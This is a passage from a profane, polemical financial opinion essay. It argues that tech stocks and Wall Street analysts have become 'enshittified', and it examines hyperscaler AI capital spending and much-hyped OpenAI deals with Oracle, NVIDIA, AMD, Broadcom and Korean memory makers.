\u201d that exist to give money to other companies , venture capitalists, and banks that are getting desperate and need an overnight shot of capital from the Federal Reserve\u2019s Overnight Repurchase Facility or Discount Window , two worrying indicators of bank stress I\u2019ll get into later. No, the money does not exist for you or me or a person . Money is for entities that could potentially funnel more money into the economy , even if the ways that these entities use the money are reckless and foolhardy, because the system\u2019s intent on keeping entities alive incentivizes it. We are in an era where the average person is told to pull up their bootstraps, to work harder, to struggle more , because, as Martin Luther King Jr. once said, it\u2019s socialism for the rich and rugged free market capitalism for the poor. The \u201cfree market\u201d is a fucking con . When you or I run out of money, our things are taken from us, we receive increasingly-panicked letters, we get phone calls and texts and emails and demands, we are told that all will be lost if we don\u2019t \u201cwork it out,\u201d because the financial system is not about an exchange of value but whether or not you can enter into the currently agreed-upon con. By letting neoliberalism and the scourge of the free markets rule , modern society created the conditions for what I call The Enshittifinancial Crisis \u2014 the place at which my friend Cory Doctorow\u2019s Enshittification Theory meets my own Rot Economy Thesis in a fourth stage of Enshittification. Per The New Yorker : Enshittification unfolds in three phases: first, a company is \u201cgood to users,\u201d Doctorow writes, drawing people in droves, as funnel traps do Japanese beetles, with the promise of connection or convenience. Second, with that mass audience consolidated, the company is \u201cgood to business customers,\u201d compromising some of its features so that the most lucrative clients, usually advertisers, can thrive on the platform. This second phase is the point at which, say, our Facebook feeds fill with ads and posts from brands. Third, the company turns the user experience into \u201ca giant pile of shit,\u201d making the platform worse for users and businesses alike in order to further enrich the company\u2019s owners and executives. I\u2019ll walk you through it. Facebook was a huge, free platform, much like Instagram, that offered fast and easy access to everybody you knew. It acquired Instagram in 2012 to kill off a likely competitor, and over time would start making both products worse \u2014 clickbait notifications, a mandatory algorithmic feed that deliberately emotionally manipulated people and stoked political division, eventually becoming full of AI slop and videos, all so that Meta could continue to sell billions of dollars of ads a quarter. Per Kyle Chayka of the New Yorker, \u201cFacebook\u2019s feed, now choked with A.I.-generated garbage and short-form videos, is well into the third act of enshittification.\u201d The third stage is critical, in that it\u2019s when the company also turns on its business customers. A Marketing Brew story from September of last year told the tale of multiple advertisers who found their campaigns switching to different audiences, wasting their money and getting questionable results. A New York Times story from 2021 described companies losing upwards of 70% of their revenue during a Facebook ads outage , another from 2018 described how Meta (then Facebook) deliberately hid issues with its measurement of engagement on videos from advertisers for over a year , and more recently, Meta\u2019s ads tools started switching out top-performing ads with AI-generated ones , in one case targeting men aged 30 to 45 with an AI-generated grandma, all without warning the advertiser . Meta doesn\u2019t give a shit, because investors and analysts don\u2019t give a shit. I could say \u201csell-side analysts\u201d here \u2014 the ones that are trying to get you to buy a stock \u2014 but based on every analyst report I\u2019ve read from a major bank or hedge fund, I truly think everybody is complicit. In November 2025, Reuters revealed that Meta projected in late 2024 that 10% of its annual revenue ($16 billion) would come from advertisements for scams or banned goods , mere weeks after Meta announced a ridiculous $27 billion data center debt package , one that used deep accountancy magic to keep it off of its balance sheet despite Meta guaranteeing the entirety of the loan. One would think this would horrify investors for two reasons: Meta\u2019s business is both supporting and profiting from organized crime, and at 10% of its revenue, it\u2019s also kind of dependent on it. Meta is using deliberate and insidious accounting tricks to act like a data center that it is paying to build and will be the sole tenant of is somehow an \u201coff balance sheet\u201d operation. One would be wrong. Morgan Stanley said a few weeks ago that it is \u201cone of the handful of companies that can leverage its leading data, distribution and investments in AI,\u201d and raised its target to $750, with a $1000-a-share bull case. Wedbush raised Meta\u2019s price to $920, and Bank of America staunchly held firm at\u2026$810 . I can find no analyst commentary on Meta making sixteen billion dollars on fraud , because it doesn\u2019t matter to them, because this is the Rot Economy, and all that matters is number go up. Reality \u2014 such as whether there\u2019s any revenue in AI, or whether it\u2019s a good idea that Meta is spending over $70 billion this year on capital expenditures on a product that has generated no revenue (and please, fucking spare me the bullshit around \u201cMeta\u2019s AI ads play,\u201d that whole story is nonsense) \u2014 doesn\u2019t matter to analysts, because stocks are thoroughly, inextricably enshittified, and analysts don\u2019t even realize it\u2019s happening. The Great Enshittification Of The Stock Market The stages of enshittification usually involve some sort of devil\u2019s deal. In Stage 1, things are good for users: the platform is free, things are easy-to-use, and thus it\u2019s really simple for you and your friends to adopt and become dependent on it. In Stage 2, things become bad for consumers, but good for business customers: the platform begins forcing users to do \u201cprofitable\u201d things \u2014 like show them more adverts by making search results worse \u2014 all while making it difficult to migrate to another one, either through locking in your data or the tacit knowledge that moving platforms is hard, and your friends are usually in one place. Businesses sink tons of money into the platform, knowing that users are unlikely to leave, and make good money buying ads against a populace that increasingly stays because it has to as there are no other options. In Stage 3, things become bad for consumers and businesses, but good for shareholders: the platforms begin to deteriorate to the point that usability is pushed to the brink, and businesses \u2014 who are now dependent on the platform because monopolies have pushed out every alternative platform to advertise or reach consumers \u2014 begin to see their product crumble, all in favour of shareholder capital, which only cares about stock value, net income and buybacks. We have now entered Enshittification Stage 4, where businesses turn on shareholders. Analysts and investors have become trapped in the same kind of loathsome platform play as consumers and businesses, and face exactly the same kinds of punishment through the devaluation of the stock itself. Where platforms have prioritized profits over the health and happiness of users or business customers, they are now prioritizing stock value over literally anything , and have \u2014 through the remarkable growth of tech stocks in particular \u2014 created a placated and thoroughly whipped investor and analyst sect that never asks questions and always celebrates whatever the next big thing is meant to be. The value of a \u201cstock\u201d is not based on whether the business is healthy, or its future certain, but on its potential price to grow, and analysts have, thanks to an incredible bull run of tech stocks going on over a decade, been able to say \u201cI bet software will be big\u201d for most of the time, going on CNBC or Bloomberg and blandly repeating whatever it is that a tech CEO just said, all without any worries about \u201cresponsibility\u201d or \u201cthe truth.\u201d This is because big tech stocks \u2014 and many other big stocks, if I\u2019m honest \u2014 have made their lives easy as long as they don\u2019t ask questions. Number always seems to be going up for software companies, and all you need to do is provide a vociferous defense of the \u201cnext big thing,\u201d and come up with a smart-sounding model that justifies eternal growth. This is entirely disconnected from the products themselves, which don\u2019t matter as long as Number Go Up . If net income is high and the company estimates it will continue to grow, then the company can do whatever the fuck it want with the product it sells or the things that it buys. Software Has Eaten The World in the sense that Andreesen got his wish, with investors now caring more about the \u201cintrinsic value\u201d of software companies rather than the businesses or products themselves. And because that\u2019s happening, investors aren\u2019t bothering to think too hard about the tech itself, or the deteriorating products underlying tech companies, because \u201cthese guys have always worked it out\u201d and \u201cthese companies have always managed to keep growing.\u201d As a result, nobody really looks too deep. Minute changes to accounting in earnings filings are ignored, egregious amounts of debt are waved off, and hundreds of billions of dollars of capital expenditures are seen as \u201cthe new AI revolution\u201d versus \u201ca huge waste of money.\u201d By incentivizing the Rot Economy \u2014 making stocks disconnected from the value of the company beyond net income and future earnings guidance \u2014 companies have found ways to enshittify their own stocks, and shareholders will be the ones who suffer, all thanks to the very downstream pressure that they\u2019ve chosen to ignore for decades. You see, while one might (correctly) see that the deterioration of products like Facebook and Google Search was a sign of desperation, it\u2019s important to also see it as the companies themselves orienting around what they believe analysts and investors want to see. You can also interpret this as weakness, but I see it another way: stock manipulation, and a deliberate attempt to reshape what \u201cvalue\u201d means in the eyes of customers and investors. If the true value of a stock is meant to be based on the value of its business, cash flow, earnings and future growth, a company deliberately changing its products is an intentional interference with value itself, as are any and all deceptive accounting practices used to boost valuations. But the real problem is that analysts do not\u2026well\u2026analyze, not, at least, if it goes against the market consensus. That\u2019s why Goldman Sachs and JP Morgan and Futurum and Gartner and Forrester and McKinsey and Morgan Stanley all said that the metaverse was inevitable \u2014 because they do not actually care about the underlying business itself, just its ability to grow on paper. Need proof that none of these people give a fuck about actual value? Mark Zuckerberg burned $77 billion on the metaverse , creating little revenue or shareholder value and also burning all that money without any real explanation as to where it went. The street didn\u2019t give a shit because meta\u2019s existent ads business continued to grow, same as it didn\u2019t give a shit that Mark Zuckerberg burned $70 billion on capex, even though we also really don\u2019t know where that went either. In fact, we really have no idea where all this AI spending is going. These companies don\u2019t tell us anything. They don\u2019t tell us how many GPUs they have, or where those GPUs are, or how many of them are installed, or what their capacity is, or how much money they cost to run, or how much money they make. Why would we? Analysts don\u2019t even look at earnings beyond making sure they beat on estimates. They\u2019ve been trained for 20 years to take a puddle-deep look at the numbers to make sure things look okay, look around their peers and make sure nobody else is saying something bad, and go on and collect fees. The same goes for hedge funds and banks propping up these stocks rather than asking meaningful questions or demanding meaningful answers. In the last two years, every major hyperscaler has extended the \u201cuseful life\u201d of its servers from 3 years to either 5.5 or 6 years \u2014 and in simple terms, this allowed them to incur a smaller depreciation expense each quarter as a result, boosting net income. Those who are meant to be critical \u2014 analysts and investors sinking money into these stocks \u2014 had effectively no reaction, despite the fact that Meta used ( per the Wall Street Journal ) this adjustment to reduce its expenses by $2.3 billion in the first three quarters of this year. This is quite literally disconnected from reality, and done based on internal accounting that we are not party to. Every single tech firm buying GPUs did this and benefited to the tune of billions of dollars in decreased revenues, and analysts thought it was fine and dandy because number went up. Shareholders are now subordinate to the shares themselves, reacting in the way that the shares demand they do, being happy for what the companies behind the shares give them, and analysts, investors and even the media spend far more energy fighting the doubters than they do showing these companies scrutiny. Much like a user of an enshittified platform, investors and analysts are frogs in a pot, the experience of owning a stock deteriorating since Jack Welch and GE taught corporations that the markets are run with the kind of simplistic mindset built for grifter exploitation. And much like those platforms, corporations have found as many ways as possible to abuse shareholders, seeing what they can get away with, seeing how far they can push things as long as the numbers look right, because analysts are no longer looking for sensible ideas. Let me give you an example I\u2019ve used before. Back in November 1998, Winstar Communications signed a \u201c$2 billion equipment and finance agreement with Lucent Technologies\u201d where Winstar would borrow money from Lucent to buy stuff from Lucent, all to create $100 million in revenue over 5 years. In December 1999, Barron\u2019s wrote a piece called \u201c In 1999 Tech Ruled \u201d: George Gilbert, who manages the Northern Technology Fund , predicts the Web-centric worlds of consumer services and software will fare well next year, too. \"A lot of people are increasing their access to the Internet,\" says Gilbert. \"And e-commerce and business networking are very high priorities for the Fortune 100.\" Lawrence York, lead portfolio manager of the WWW Internet Fund, is bullish on semiconductors, telecommunications and business-to-business \u2013 or B2B \u2013 e-commerce software. But he's wary of online retailers. \"That model won't work long term,\" he asserts. His top B2B picks? Ariba and Official Payments. In wireless, he likes Winstar , Ciena and AirNet Communications , which went public earlier this month. Airnet? Bankrupt . WinStar? Horribly bankrupt. While Ciena survived, it had spent over a billion dollars to acquire other companies (all stock , of course), only to see its revenue dwindle basically overnight from $1.6bn to $300 million as the optical cable industry collapsed . One would have been able to work out that Winstar was a dog, or that all of these companies were dogs, if you were to look at the numbers, such as \u201chow much they made versus how much they were spending.\u201d Instead, analysts, the media and banks chose to pump up these stocks because the numbers kept getting bigger, and when the collapse happened, rationalizations were immediately created \u2014 there were a few bad apples (Enron, Winstar, WorldCom), \u201cthe fiber was useful\u201d and thus laying it was worthwhile, and otherwise everything was fine. The problem, in everybody else\u2019s mind, was that everybody had got a bit distracted and some companies that weren\u2019t good would die. All of that lost money was only a problem because it didn\u2019t pay off. This was a misplaced gamble, and it taught tech executives one powerful lesson: earnings must be good, without fail, by any means necessary, and otherwise nothing else matters to Wall Street. It\u2019s all about incentives. A sell-side analyst that tells you not to buy something is a problem. A journalist that is skeptical or critical of an industry in the midst of a growth or hype cycle is considered a \u201chater\u201d \u2014 don\u2019t I fucking know it . Analysts that do not sing the same tune as everybody else are marginalized, mocked and aggressively policed. And I don\u2019t fucking care. Stop being fucking cowards. By not being skeptical or critical you are going to lead regular people into the jaws of another collapse. The dot com bubble was actually a great time to start reevaluating how and why we value stocks \u2014 to say \u201chey, wait, that $2 billion deal will only make $100 million in revenue?\u201d or \u201cthis company spends $5 for every $1 it makes!\u201d \u2014 but nobody, it appears, remained particularly suspicious of the tech industry, or a stock market that was increasingly orienting itself around conning shareholders. And because shareholders, analysts and the media alike refused to retain a single shred of suspicion leaving the dot com era, the mania never actually subsided. Financial publications still found themselves dedicated to explaining why the latest hype cycle was real. Journalists still found themselves told by editors that they had to cover the latest fad, even if it was nonsensical or clearly rotten. Analysts still grabbed their swords and rushed to protect the very companies that have spent decades misleading them. Much like we spent years saying that Facebook was a \u201cgood deal\u201d because it was free, analysts and investors say tech stocks are \u201cgreat to hold\u201d because they kept growing, even if the reason they \u201ckept growing\u201d was a series of interlocking monopolies, difficult-to-leave platforms and impossible-to-fight traction and pricing, all of which have an eventual sell-by date. I realize I\u2019m pearl-clutching over the amoral status of capitalism and the stock market, but hear me out: what if we\u2019re actually in a 15-to-20-year-long knife-catching competition? What if all anybody has done is look at cashflow, net income, future growth guidance, and called it a day? A lack of scrutiny has allowed these companies to do effectively anything they want, bereft of worrisome questions like \"will this ever make a profit?\" What if we basically don\u2019t know what the fuck is going on? What if all of this was utterly senseless? AI Accelerated The Enshittification Of The Stock Market As I wrote last year, the tech industry has run out of hypergrowth ideas, facing something I call \u201cthe Rot Com bubble .\u201d In simple terms, they\u2019re only \u201cdoing AI\u201d because there do not appear to be any other viable ideas to continue the Rot Economy\u2019s eternal growth-at-all-costs dance. Yet because growth hasn\u2019t slowed yet , analysts, the media and other investors are quick to claim that AI is \u201c paying off ,\u201d even if nobody has ever said how much AI revenue is being generated or, in the case of Salesforce, they can say \u201c nearly $1.4 billion ARR ,\u201d which sounds really big until you realize a company with $10.9 billion in revenue is boasting about making less than $116 million in revenue in a month. Nevertheless, because Salesforce set a new revenue target of $60 billion by 2030, the stock jumped 4% . It doesn\u2019t matter that most Agentforce customers don\u2019t pay for the service, or that AI isn\u2019t really making much money, or really anything, other than Number Go Up. The era we live in is one of abject desperation, to the point that analysts and investors \u2014 and shareholders by extension \u2014 will take any abuse from management. They will allow companies to spend as much money as they want in whatever ways they want, as long as it continues the charade of \u201cnumber go up.\u201d Let me spell it out a little more, using the latest earnings of various hyperscalers as an example. According to its latest quarterly filings, Microsoft spent $34.9 billion on capital expenditures , Amazon $34.2 billion , Meta $19.37 billion , and Google $24 billion . The common mantra is that these companies are \u201cspending all this money on GPUs,\u201d but that doesn\u2019t match up with NVIDIA\u2019s revenues. NVIDIA\u2019s last quarterly earnings said that four direct customers made up more than 10% of revenue \u2014 22% ($12.54bn), 15% ($8.55bn), 13% ($7.41bn) and 11% ($6.27bn) out of $57 billion. While this sort of lines up with capex spend, it doesn\u2019t if you shift back a quarter, when Microsoft spent $21.4 billion , Meta $17.01 billion , Amazon $31.4 billion and Google $22.4 billion , with the vast majority on \u201ctechnical infrastructure.\u201d In the same quarter, NVIDIA had only two customers that accounted for more than 10% \u2014 one 23% ($10.7bn) and one 16% ($7.47bn) out of $46.7 billion. Another quarter back, and Microsoft spent $22.6 billion , Meta $13.69 billion , Google $17.2 billion and Amazon $22.4 billion . In the same quarter, NVIDIA had two customers accounting for more than 10% of revenue \u2014 16% ($7.49bn) and 14% ($6.168bn). Where, exactly, is all this money going? In Microsoft\u2019s latest earnings (Q1FY26), it said that $19.39 billion went to \u201cadditions to property and equipment,\u201d with \u201croughly half of [its total capex] spend on short-lived assets, primarily GPUs and CPUs.\u201d A quarter (Q4FY2025) back, additions to property and equipment were $16.74 billion, with \u201croughly half\u2026[spent] on long-lived assets that will support monetization over the next 15 years and beyond.\u201d Let\u2019s assume that Microsoft is NVIDIA\u2019s biggest customer every single quarter \u2014 customer A, spending $12.5 billion (out of $34.9 billion), $10.7 billion (out of $21.4 billion) and $7.049 billion (out of $22.6 billion) a quarter. Assuming that Microsoft is only buying NVIDIA\u2019s Blackwell GPUs (forgive the model numbers, but it\u2019s based on my own modeling. Let\u2019s say 40% B200s, 30% GB200s, 10% B300s and 20% GB300s), that works out to about 457MW of IT load for Q1FY26, 391MW for Q4FY25 and (adjusting to include more H200s, as the B300/GB300s were not shipping yet) 263MW for Q3FY25. Has Microsoft built 1.11GW of data centers in that time? Apparently! It claims it added 2GW in the last year , but Satya Nadella claimed in November that Microsoft had chips in inventory it couldn\u2019t install due to a lack of power. In any case, where did the remaining $22.4 billion, $11.9 billion and $15.5 billion in capex flow? We know there are finance leases. What for? More GPUs? What is the actual output of these expenditures? We have no idea, because analysts and investors are in an abusive relationship with tech stocks. It is fundamentally insane that Microsoft, Meta, Amazon and Google have spent $776 billion in capital expenditures in the space of three years , and even more so that analysts and investors, when faced with such egregious numbers, simply sit back and say \u201cthey\u2019re building the infrastructure of the future, baby!\u201d Analysts and traders and investors and reporters do not think too hard about the underlying numbers, because doing so immediately makes you run head-first into a number of worrying questions such as \u201cwhere did all that money go?\u201d and \u201cwill any of this pay off?\u201d and \u201chow many GPUs do they actually own?\u201d Analysts have, on some level, become the fractional marketing team for the stocks they\u2019re investing in. When Oracle announced its $300 billion deal with OpenAI in September \u2014 one that Oracle does not have the capacity to fill and OpenAI does not have the money to pay for \u2013 analysts heaved and stammered like horny teenagers seeing their first boob: John DiFucci from Guggenheim Securities said he was \u201cblown away.\u201d TD Cowen\u2019s Derrick Wood called it a \u201cmomentous quarter.\u201d And Brad Zelnick of Deutsche Bank said, \u201cWe\u2019re all kind of in shock, in a very good way.\u201d \u201cThere\u2019s no better evidence of a seismic shift happening in computing than these results that you just put up,\u201d Zelnick said on the earnings call. These are the same people that retail and institutional investors rely upon for advice on what stocks to buy, all acting with the disregard for the truth that comes from years of never facing a consequence. Three months later, and Oracle has lost basically all of the stock bump it saw from the OpenAI deal, meaning that any retail investor that YOLO\u2019d into the trade because, say, analysts from major institutions said it was a good idea and news outlets acted like this deal was real , already got their ass kicked. And please, spare me the \u201coh they shouldn\u2019t trade off of analysts\u201d bullshit. That\u2019s the kind of victim-blaming that allows these revered fuckwits to continue farting out these meaningless calls. In reality, we\u2019re in an era of naked, blatant, shameless stock manipulation, both privately and publicly, because a \u201cstock\u201d no longer refers to a unit of ownership in a company so much as it is a chip at a casino where the house constantly changes the rules. Perhaps you\u2019re able to occasionally catch the house showing its hand, and perhaps the house meant for you to see it. Either way, you are always behind, because the people responsible for buying and selling stocks at scale under the auspices of \u201cknowing what\u2019s going on\u201d don\u2019t seem to know what they\u2019re talking about, or don\u2019t care to find out. Let\u2019s walk through the latest surge of blatant stock manipulation, and how the media and analysts helped it happen. Oracle, September 10 2025 Oracle announces its unfillable, unpayable $300 billion deal with OpenAI , leading to 30%+ bump in stock price . Analysts, who should ostensibly be able to count, call it \u201cmomentous\u201d and say they\u2019re \u201cin shock.\u201d On September 22 2025, CEO Safra Catz steps down , and nobody seems to think that\u2019s weird or suspicious. Two months later, Oracle\u2019s stock is down 40% , with investors worried about Oracle\u2019s growing capex, which is surprising I suppose if you didn\u2019t think about how Oracle would build the fucking data centers. Basically anyone who traded into this got burned. NVIDIA, September 22 2025 NVIDIA announced a \u201cstrategic partnership\u201d to invest \u201cup to $100 billion\u201d and build 10GW of data centers with OpenAI, with the first gigawatt to be deployed in the second half of 2026. Where would the data centers go? How would OpenAI afford to build them? How would OpenAI build a gigawatt in less than a year? Don\u2019t ask questions, pig! NVIDIA\u2019s stock bumped from from $175.30 to $181 in the space of a day. The media wrote about the story as if the deal was done, with CNBC claiming that \u201cthe initial $10 billion tranche [was] expected to close within a month or so once the transaction has been finalized.\u201d I read at least ten stories that said that \u201cNVIDIA had invested $100 billion.\u201d Analysts would say that NVIDIA was \u201clocking in OpenAI\u201d to \u201cremain the backbone of the next-gen AI infrastructure,\u201d that \u201cdemand for NVIDIA GPUs is effectively baked into the development of frontier AI models,\u201d that the deal \u201c[strengthened] the partnership between the two companies\u2026[and] validates NVIDIA\u2019s long-term growth numbers with so much volume and compute capacity.\u201d Others would say that NVIDIA was \u201cenabling OpenAI to meet surging demand.\u201d Three analysts \u2014 Rasgon at Bernstein, Luria at D.A. Davidson and Wagner at Aptus Capital \u2014 all raised circular deal concerns, but they were the minority, and those concerns were still often buried under buoyant optimism about the prospects of the company. One eensy weensy problem though, everyone! This was a \u201cletter of intent\u201d \u2014 it said so in the announcement! \u2014 and on NVIDIA\u2019s November earnings , it said that it \u201centered into a letter of intent with an opportunity to invest in OpenAI.\u201d It turns out the deal didn\u2019t exist and everybody fell for it! NVIDIA hasn\u2019t sent a dime and likely won\u2019t. A letter of intent is a \u201cconcept of a plan.\u201d SK Hynix, Samsung, October 1 2025 Back in October, Reuters reported that Samsung and SK Hynix had \" signed letters of intent to supply memory chips for OpenAI's data centers ,\" with South Korea's presidential office saying that said chip demand was expected to reach \"900,000 wafers a month,\" with \"much of that from Samsung and SK Hynix,\" which was quickly extrapolated to mean around 40% of global DRAM output . Stocks in both companies, to quote Reuters , \u201csoared,\u201d with Samsung climbing 4% and SK Hynix more than 12% to an all-time high. Analyst Jeff Kim of KB Securities said that \u201cthere have been worries about high bandwidth memory prices falling next year on intensifying competition, but such worries will be easily resolved by the strategic partnership,\u201d adding that \u201cSince Stargate is a key project led by President Trump, there also is a possibility the partnership will have a positive impact on South Korea's trade negotiations with the U.S.\u201d Donald Trump is not \u201cleading Stargate.\u201d Stargate is a name used to refer to data centers built by OpenAI. KB Securities has around $43 billion of assets under management. This is the level of analysis you get from these analysts! This is how much they know! On SK Hynix's October 29 2025 earnings call , weeks after the announcement, its CEO, Kim Woo-Hyun, was asked a question about High Bandwidth Memory growth by SK Kim from Daiwa Securities: Kim: Thank you very much for taking my question. It is on demand. Now, there have been a series of announcements of GPU and ASIC supply cooperation between Big Techs and AI companies, fueling expectations of further AI market growth. Then, against this backdrop, what is the company's outlook on HBM demand growth, as well as a broadening of the customer base? SK Hynix: Thank you for the question. Now, with upward adjustment in Big Tech's CapEx and increased investment by AI companies, the HBM market, even by a conservative estimate, will keep growing at an average of over 30% for the next five years. I will point to our recent LOI with OpenAI for large-scale DRAM supply as an example of the very strong market demand for AI, as well as the need to secure AI memory based on HBM more than anything else when developing AI technology. This is the only mention of OpenAI. Otherwise, SK Hynix has not added any guidance that would suggest that its DRAM sales will spike beyond overall growth, other than mentioning it had \"completed year 2026 supply discussions with key customers.\" There is no mention of OpenAI in any earnings presentation. On Samsung's October 30 2025 earnings call , Samsung mentioned the term \"DRAM\" 18 times, and neither mentioned OpenAI nor any letters of intent. In its Q3 2025 earnings presentation, Samsung mentions it will \"prioritize the expansion of the HBM4 [high bandwidth memory 4] business with differentiated performance to address increasing AI demand.\" Analysts do not appear to have noticed a lack of revenue from an apparent deal for 40% of the world\u2019s RAM! Oh well! Pobody\u2019s nerfect! Both Samsung and SK Hynix\u2019s stocks have continued to rise since, and you\u2019d be forgiven for thinking this deal was something to do with it, even though it wasn\u2019t. AMD, October 5, 2025 AMD announced that it had entered a \u201cmulti-year, multi-generation agreement\u201d with OpenAI to build 6 GW of data centers, with \u201cthe first 1GW deployment set to begin in the second half of 2026,\u201d calling the agreement \u201cdefinitive\u201d with terms that allowed OpenAI to buy up to 10% of AMD\u2019s stock, vesting over \u201cspecific milestones\u201d that started with the first gigawatt of data center development. Said data centers would also use AMD\u2019s yet-to-be-released MI450 GPUs. The deal would, per Reuters , bring in \u201ctens of billions of dollars of revenue.\u201d Where would those data centers go? How would OpenAI pay for them? Would the chips be ready in time? Silence, worm! How dare you ask questions? How dare you? Why are you asking questions? NUMBER GO UP! AMD\u2019s shares surged by 34% , with analyst Dan Ives of Wedbush saying that this was a \u201cmajor valuation moment\u201d for AMD. As an aside, Ives said that NVIDIA would benefit from the metaverse in 2021 , and told CBS News in November 22 2021 that \u201c the metaverse [was] real and Wall Street [was] looking for winners .\u201d One would think that AMD\u2019s November earnings \u2014 a month after the announcement \u2014 might be a barn-burner full of remaining performance obligations from OpenAI. In fact, CEO Lisa Su said that \u201c[AMD expected] this partnership will significantly accelerate [its] data center AI business, with the potential to generate well over $100 billion in revenue over the next few years.\u201d Here\u2019s how AMD\u2019s 10-Q filing referred to it:\\t As of September 27, 2025, the aggregate transaction price allocated to remaining performance obligations under contracts with an original expected duration of more than one year was $279 million, of which $139 million is expected to be recognized in the next 12 months. The revenue allocated to remaining performance obligations does not include amounts which have an original expected duration of one year or less. \u2026so, no revenue from OpenAI at all, I guess? AMD raised guidance by 35% over the next five years AMD's trailing 12-month revenue is $32 billion . \"Tens of billions of dollars\" would surely lead to more than a 35% boost (an increase of $11.2 billion or so) in the next five years? Guess all of that was for nothing. No follow-up from the media, no questions from analysts, just a shrug and we all move on. Anyway, AMD\u2019s stock is now down from a high of $259 at the end of October to around $214 as of writing this sentence. Everybody who traded in based on analyst and media comments got fucked. Broadcom, October 13, 2025 So, back on September 5, Broadcom said on its earnings call that it had a $10 billion order from a mystery customer, which analysts quickly assumed was OpenAI , leading to the stock popping 9%, and gradually increasing to a high of $369 or so on September 10, before declining a little until October 13, when Broadcom announced its ridiculous 10 gigawatt deal with OpenAI , claiming that it would deploy 10GW of OpenAI-designed chips, with the first racks to deploy the second half of 2026 and the entire deployment completed by end of 2029. The same day, its president of semiconductor solutions Charlie Kawwas added that said mystery customer was actually somebody else : \u201cI would love to take a $10 billion [purchase order] from my good friend Greg [Brockman, COO of OpenAI],\u201d Kawwas said. \u201cHe has not given me that PO yet.\u201d Nevertheless, Broadcom's stock popped by 9% on the news about the 10GW deal, with CNBC adding that \"the companies have been working together for 18 months.\" Because it's OpenAI, nobody sat and thought about whether somebody at Broadcom saying \"well, OpenAI has yet to order these chips yet\" was a problem. In fact, the answer to \u201chow does OpenAI afford this?\u201d appeared to be \u201cthey\u2019d afford it\u201d when it came to analysts: The 2026 timeline set out by OpenAI for the build-out is aggressive, but the startup is also best positioned to raise the funds required for the project, given the heights of investor confidence, said Gadjo Sevilla, an analyst at eMarketer. \"Financing such a large chip deal will likely require a combination of funding rounds, pre-orders, strategic investments, and support from Microsoft (MSFT.O), as well as leveraging future revenue streams and potential credit facilities.\" Not to worry, OpenAI\u2019s solution was far simpler: it didn\u2019t order any chips. During Broadcom's November earnings call, where Broadcom revealed that the $10 billion order was actually from Anthropic , another LLM startup that burns billions of dollars, which was buying Google's TPUs, and also booked another $11 billion in orders. Analysts somehow believed that Anthropic is \u201cpositioned to spend heavily\u201d despite being another venture-backed welfare recipient in the same flavor as OpenAI. Oh, right, that 10GW OpenAI deal. Broadcom CEO Hock Tan said that he did \u201c not expect much in 2026 \u201d from the deal, and guidance did not change to reflect it. Broadcom climbed to a high of $412 leading up to its earnings, and I imagine it did so based on people trading on the belief that OpenAI and Broadcom were doing a deal together, which does not appear to be happening. While there\u2019s an alleged $73 billion backlog, every dollar from Anthropic is questionable. But Ed, We Can\u2019t Distrust Public Companies! Actually, yes we can. Whenever a company says \u201cletter of intent\u201d \u2014 as NVIDIA and SK Hynix/Samsung did \u2014 it\u2019s important to immediately stop taking the deal seriously until you get the word \u201ccontract\u201d involved. Not \u201cagreement\u201d or \u201cdeal\u201d or \u201cannouncement,\u201d but \u201ccontract,\u201d because contracts are the only thing that actually matters. Similarly, it\u2019s time for everybody \u2014 analysts, the media, members of congress, the fucking pope, I don\u2019t care \u2014 to start treating these companies with suspicion, and to start demanding timelines. NVIDIA and Microsoft announced their $15 billion investment in Anthropic over a month ago. Where\u2019s the money? Why does the agreement say \u201cup to $10 billion\u201d for NVIDIA and \u201cup to $5 billion\u201d from Microsoft? These subtle details suggest that the deal is not going to be for $15 billion, and the lack of activity suggests it might not happen at all. These deals are announced with the intention of suggesting there is more revenue and money in generative AI than actually exists. Furthermore, it is irresponsible and actively harmful for analysts and the media to continually act as if these deals will actually get paid when you consider the financial conditions of these companies. As part of its alleged funding announcement with NVIDIA and Microsoft, Anthropic agreed to purchase $30 billion of Azure compute . It also agreed to spend \"tens of billions of dollars\" with Google Cloud . It ordered $10 billion in chips from Broadcom earlier in the year, and apparently placed another $11 billion order in its latest fiscal quarter . How does it pay for those? It allegedly will burn $2.8 billion this year (I believe it burned much, much more ) and raised $16.5 billion in funding (before Microsoft and NVIDIA\u2019s involvement, which we cannot confirm has actually happened). How are investors tolerating Broadcom not directly stating \u201cthe future financial condition of this company is questionable\u201d? Has Broadcom created a reserve for this deal? If not, why not? Anthropic will make no more than $5 billion this year, and has raised $17.5bn (with a further $2.5bn coming in the form of debt). How can it foreseeably afford to pay $10 billion, or $11 billion, or $21 billion, considering its already massive losses and all those other obligations mentioned? Will Jensen Huang hand over $10 billion so that Anthropic can hand it to Broadcom? I realize the counter-argument is that companies aren\u2019t responsible for their counterparties\u2019 financial health, but my argument is that it\u2019s the responsibility of any public company to give a realistic view of its financial health, which includes noting if a chunk of its revenue is from a startup that can\u2019t afford to pay for its orders. There is no counter to that! Anthropic cannot afford to pay Broadcom $10 billion right now! Nevertheless, the problem is that in any bubble, being really stupid and ignorant works right up until it doesn\u2019t, and however harsh the dot com bubble might have been, it wasn\u2019t harsh enough and those who were responsible were left unpunished and unashamed, guaranteeing that this cycle would happen again. I want to be really, abundantly clear about what\u2019s happening: every single stock you see \u201cgrowing because of AI\u201d outside of those selling RAM and GPUs is actually growing because of something else. Microsoft, Amazon, Google and Meta all have other products that are making them money. AI is not doing it, and because analysts and investors do not think about things for two seconds, they have allowed themselves to be beaten down and turned into supplicants for public stocks. Investors have allowed themselves to be played, and the results will be worse than the dot com bubble bursting by several echelons. The Great Enshittifinancial Crisis AI Is An Existential Threat To Venture Capital I\u2019m gonna be really simplistic for a second. I am skeptical of AI because everybody loses money. I believe every AI company is unprofitable with margins that are getting increasingly worse as they scale , and as a result that none of them will be able to either get acquired or go public. Sidenote: This was always the way that venture worked \u2014 pump up an unprofitable startup, then sell it to a hyperscaler or take it public, and then let the rest of the world deal with the toxic asset until it either died or wasn\u2019t toxic anymore. This means that venture capitalists that have sunk money into AI stocks are going to be sitting on a bunch of assets under management (AUM) \u2014 the same assets they collect fees on \u2014 that will eventually crater or go to zero, because there will be no way for any liquidity event to occur. This is at a time of historically-low liquidity for venture capitalists, with Pitchbook estimating there will only be $100.8 billion in venture capital funds available at the end of 2025 . Venture capitalists raise money from limited partners, who invest in venture capital with the hope of returns that outpace investing in the public markets. Venture capital vastly overinvested during 2021 and 2022, This was also a problem in private equity . In simple terms, this means these funds are sitting on tons of stock that they cannot shift, and the longer it takes for a company to either go public or acquired, the more likely it is the VC or PE firm will have to mark down its value. This is so bad that according to Carta, as of August 